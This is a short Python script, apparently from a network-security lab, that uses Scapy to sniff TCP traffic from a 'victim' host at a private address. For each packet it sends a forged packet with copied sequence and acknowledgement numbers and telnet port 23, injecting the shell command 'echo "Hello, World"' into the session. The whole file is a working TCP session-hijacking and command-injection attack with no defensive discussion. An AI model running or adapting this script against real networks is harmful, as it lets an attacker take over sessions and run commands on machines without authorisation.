from scapy.all import *
import time

"""
Sniff packets sent from victim, forward packet
onto observer with spoofed payload
"""
sniff(
    filter="tcp and src 192.168.56.101",
    prn=lambda x:
        send(IP(dst=x.sprintf("%IP.dst%"),src=x.sprintf("%IP.src%"))/TCP(
            flags=x.sprintf("%TCP.flags%"),
            dport=int(x.sprintf("%TCP.dport%")),
            sport=23,
            ack=int(x.sprintf("%TCP.ack%")),
            seq=int(x.sprintf("%TCP.seq%")))/Raw("echo \"Hello, World\"")))
